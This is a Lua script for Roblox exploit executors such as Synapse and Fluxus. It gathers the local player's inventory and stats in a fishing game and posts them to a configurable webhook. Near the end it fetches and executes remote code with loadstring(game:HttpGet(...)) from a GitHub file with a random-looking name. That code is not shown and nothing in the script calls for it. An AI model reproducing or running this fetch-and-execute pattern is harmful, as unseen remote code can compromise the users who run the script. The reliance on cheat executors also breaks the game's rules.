local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local player = game.Players.LocalPlayer

player.CameraMaxZoomDistance = 1000

local httpRequest = (syn and syn.request) or (http and http.request) or http_request or (fluxus and fluxus.request)

local function cleanItemName(rawName)
    return rawName:match("^(.-)%d*$") or rawName
end

local function countItemsInInventory(player)
    local inventory = ReplicatedStorage:FindFirstChild("playerstats")
        :FindFirstChild(player.Name)
        :FindFirstChild("Inventory")
    
    if not inventory then
        warn("Inventory not found for player:", player.Name)
        return {}
    end

    local itemCounts = {}
    for _, item in ipairs(inventory:GetChildren()) do
        if item:IsA("StringValue") and item:FindFirstChild("Stack") and item.Stack:IsA("NumberValue") then
            local cleanName = cleanItemName(item.Name)  -- ลบตัวเลขจากชื่อ
            local stackValue = item.Stack.Value
            
            if itemCounts[cleanName] then
                itemCounts[cleanName] += stackValue
            else
                itemCounts[cleanName] = stackValue
            end
        elseif item:IsA("StringValue") and cleanItemName(item.Name) == "Treasure Map" then
            local xValue = item:FindFirstChild("x")
            local yValue = item:FindFirstChild("y")
            local zValue = item:FindFirstChild("z")
            
            if xValue and yValue and zValue then
                print("Treasure Map with coordinates:", xValue.Value, yValue.Value, zValue.Value)
                local count = itemCounts["Treasure Map"] or 0
                itemCounts["Treasure Map"] = count + 1
            else
                if not xValue then
                    warn("Treasure Map has no x value")
                end
                if not yValue then
                    warn("Treasure Map has no y value")
                end
                if not zValue then
                    warn("Treasure Map has no z value")
                end
            end
        else
            warn("Item or Stack invalid:", item.Name)
        end
    end

    return itemCounts
end

local function formatNumberWithCommas(num)
    local numStr = tostring(num)
    return numStr:reverse():gsub("(%d%d%d)", "%1,"):reverse():gsub("^,", "")
end

local itemCounts = countItemsInInventory(player)
local specialItemName = {
    "Treasure Map",
    "The Depths Key"
}

local playerStats = ReplicatedStorage:FindFirstChild("playerstats")
local coins = playerStats and playerStats:FindFirstChild(player.Name) and playerStats[player.Name]:FindFirstChild("Stats") and playerStats[player.Name].Stats:FindFirstChild("coins")
local coinValue = coins and coins.Value or 0

local levels = playerStats and playerStats:FindFirstChild(player.Name) and playerStats[player.Name]:FindFirstChild("Stats") and playerStats[player.Name].Stats:FindFirstChild("level")
local levelValue = levels and levels.Value or 0

local rod = playerStats and playerStats:FindFirstChild(player.Name) and playerStats[player.Name]:FindFirstChild("Stats") and playerStats[player.Name].Stats:FindFirstChild("rod")
local rodValue = rod and rod.Value or 0

local streak = playerStats and playerStats:FindFirstChild(player.Name) and playerStats[player.Name]:FindFirstChild("Stats") and playerStats[player.Name].Stats:FindFirstChild("tracker_streak")
local streakValue = streak and streak.Value or 0

local perfect = playerStats and playerStats:FindFirstChild(player.Name) and playerStats[player.Name]:FindFirstChild("Stats") and playerStats[player.Name].Stats:FindFirstChild("tracker_perfectcatches")
local perfectValue = perfect and perfect.Value or 0

local fishcaught = playerStats and playerStats:FindFirstChild(player.Name) and playerStats[player.Name]:FindFirstChild("Stats") and playerStats[player.Name].Stats:FindFirstChild("tracker_fishcaught")
local fishcaughtValue = fishcaught and fishcaught.Value or 0

local crabcagesopened = playerStats and playerStats:FindFirstChild(player.Name) and playerStats[player.Name]:FindFirstChild("Stats") and playerStats[player.Name].Stats:FindFirstChild("tracker_crabcagesopened")
local crabcagesopenedValue = crabcagesopened and crabcagesopened.Value or 0

local playerexp = playerStats and playerStats:FindFirstChild(player.Name) and playerStats[player.Name]:FindFirstChild("Stats") and playerStats[player.Name].Stats:FindFirstChild("xp")
local playerexpValue = playerexp and playerexp.Value or 0

local spawnlocation = playerStats and playerStats:FindFirstChild(player.Name) and playerStats[player.Name]:FindFirstChild("Stats") and playerStats[player.Name].Stats:FindFirstChild("spawnlocation")
local spawnlocationValue = spawnlocation and spawnlocation.Value or 0

local formattedCoinValue = formatNumberWithCommas(coinValue)
local formattedLevelValue = formatNumberWithCommas(levelValue)
local formattedRodValue = formatNumberWithCommas(rodValue)
local formattedStreakValue = formatNumberWithCommas(streakValue)
local formattedPerfectValue = formatNumberWithCommas(perfectValue)
local formattedFishcaughtValue = formatNumberWithCommas(fishcaughtValue)
local formattedCrabCagesValue = formatNumberWithCommas(crabcagesopenedValue)
local formattedExpValue = formatNumberWithCommas(playerexpValue)
local setspawnlocationValue = formatNumberWithCommas(spawnlocationValue)

local moreItemsText1 = ""
local moreItemsText2 = ""
local moreItemsText3 = ""

local function highlightItemName(itemName)
    if table.find(_G.highlightItems, itemName) then
        return "- " .. itemName .. ""
    else
        return itemName
    end
end

local itemCount = 0
for itemName, count in pairs(itemCounts) do
    if not table.find(_G.selectItems, itemName) then
        itemCount = itemCount + 1
        local highlightedItemName = highlightItemName(itemName)
        if itemName == "Treasure Map" then
            if itemCount <= 40 then
                moreItemsText1 = moreItemsText1 .. highlightedItemName .. " : " .. formatNumberWithCommas(count) .. "\n"
            elseif itemCount <= 80 then
                moreItemsText2 = moreItemsText2 .. highlightedItemName .. " : " .. formatNumberWithCommas(count) .. "\n"
            else
                moreItemsText3 = moreItemsText3 .. highlightedItemName .. " : " .. formatNumberWithCommas(count) .. "\n"
            end
        elseif itemName == "The Depths Key" then
            if itemCount <= 40 then
                moreItemsText1 = moreItemsText1 .. highlightedItemName .. " : " .. formatNumberWithCommas(count) .. "\n"
            elseif itemCount <= 80 then
                moreItemsText2 = moreItemsText2 .. highlightedItemName .. " : " .. formatNumberWithCommas(count) .. "\n"
            else
                moreItemsText3 = moreItemsText3 .. highlightedItemName .. " : " .. formatNumberWithCommas(count) .. "\n"
            end
        elseif itemCount <= 40 then
            moreItemsText1 = moreItemsText1 .. highlightedItemName .. " : " .. formatNumberWithCommas(count) .. "\n"
        elseif itemCount <= 80 then
            moreItemsText2 = moreItemsText2 .. highlightedItemName .. " : " .. formatNumberWithCommas(count) .. "\n"
        else
            moreItemsText3 = moreItemsText3 .. highlightedItemName .. " : " .. formatNumberWithCommas(count) .. "\n"
        end
    end
end

local secondaryFields = {}
local mainFields = {}

table.insert(mainFields, {
    name = "Rod",
    value = formattedRodValue,
    inline = false
})

table.insert(mainFields, {
    name = "Levels",
    value = formattedLevelValue,
    inline = false
})

table.insert(mainFields, {
    name = "Exps",
    value = formattedExpValue,
    inline = false
})

table.insert(mainFields, {
    name = "Coins",
    value = formattedCoinValue .. " C$",
    inline = false
})

table.insert(mainFields, {
    name = "------------------------------------------",
    value = "",
    inline = false
})

table.insert(mainFields, {
    name = "Fish Caught",
    value = formattedFishcaughtValue,
    inline = false
})

table.insert(mainFields, {
    name = "Perfect Catches",
    value = formattedPerfectValue,
    inline = false
})

table.insert(mainFields, {
    name = "Catch Streaks",
    value = formattedStreakValue,
    inline = false
})

table.insert(mainFields, {
    name = "------------------------------------------",
    value = "",
    inline = false
})

table.insert(mainFields, {
    name = "Spawn location",
    value = setspawnlocationValue,
    inline = false
})

table.insert(mainFields, {
    name = "Crab Cages Opened",
    value = formattedCrabCagesValue,
    inline = false
})

table.insert(secondaryFields, {
    name = "------------------------------------------",
    value = "",
    inline = false
})

table.insert(secondaryFields, {
    name = "[** The items you have selected are here **]",
    value = "",
    inline = false
})

for _, itemName in ipairs(_G.selectItems) do
    local count = itemCounts[itemName] or 0
    local formattedCashCount = formatNumberWithCommas(count)
    table.insert(secondaryFields, {
        name = itemName,
        value = "Count : " .. formattedCashCount,
        inline = false
    })
end

local playerInfoField = {
    name = "Player Name",
    value = player.Name .. " (" .. player.DisplayName .. ")",
    inline = false
}

local Time = os.date("%H:%M")
local Date = os.date("%Y-%m-%d")

local payload = {
    username = "Check Inventory | PHE",
    avatar_url = "https://github.com/PHOOMPHAT-Git/New-Phe-web-code/blob/main/Juice.png?raw=true",
    content = "\n\n" .. Time .. "\n\n" .. Date,
    embeds = {
        {
            title = "[** Check Inventory **]",
            type = "rich",
            description = "Made by Phoomphat",
            color = tonumber(0xFF0000),
            fields = {
                {name = "------------------------------------------", value = "", inline = false},
                playerInfoField,
            }
        },
        {
            title = "[** Player Info **]",
            type = "rich",
            color = tonumber(0x808080),
            fields = {
                unpack(mainFields)
            }
        },
        {
            title = "[** More Items 1 **]",
            type = "rich",
            description = "Made by Phoomphat",
            color = tonumber(0x808080),
            fields = {
                {
                    name = "------------------------------------------",
                    value = moreItemsText1 ~= "" and moreItemsText1 or "No additional items.",
                    inline = false
                }
            }
        },
        {
            title = "[** More Items 2 **]",
            type = "rich",
            description = "Made by Phoomphat",
            color = tonumber(0x808080),
            fields = {
                {
                    name = "------------------------------------------",
                    value = moreItemsText2 ~= "" and moreItemsText2 or "No additional items.",
                    inline = false
                }
            }
        },
        {
            title = "[** More Items 3 **]",
            type = "rich",
            description = "Made by Phoomphat",
            color = tonumber(0x808080),
            fields = {
                {
                    name = "------------------------------------------",
                    value = moreItemsText3 ~= "" and moreItemsText3 or "No additional items.",
                    inline = false
                }
            }
        },
        {
            title = "[** Check Inventory **]",
            type = "rich",
            color = tonumber(0x0000FF),
            fields = {
                playerInfoField,
                {name = "------------------------------------------", value = "\n\n" .. Time .. "\n\n" .. Date .. "\n\n", inline = false},
                unpack(secondaryFields),
            }
        }
    }
}

_G.ScriptName = "Check Inventory"
loadstring(game:HttpGet('https://raw.githubusercontent.com/PHOOMPHAT-Git/Lua-Zone/refs/heads/main/dwcqweyhfbwregbfyiokgfnbac.lua'))()

print("Payload being sent :")
print(HttpService:JSONEncode(payload))

local response = httpRequest({
    Url = _G.CheckInventory_WebhookURL,
    Method = "POST",
    Headers = {
        ["Content-Type"] = "application/json"
    },
    Body = HttpService:JSONEncode(payload)
})

if response and response.Success then
    print("Webhook sent successfully!")
else
    warn("Failed to send webhook.")
    if response then
        print("Status Code :", response.StatusCode)
        print("Response :", response.Body)
    else
        print("Response is nil.")
    end
end
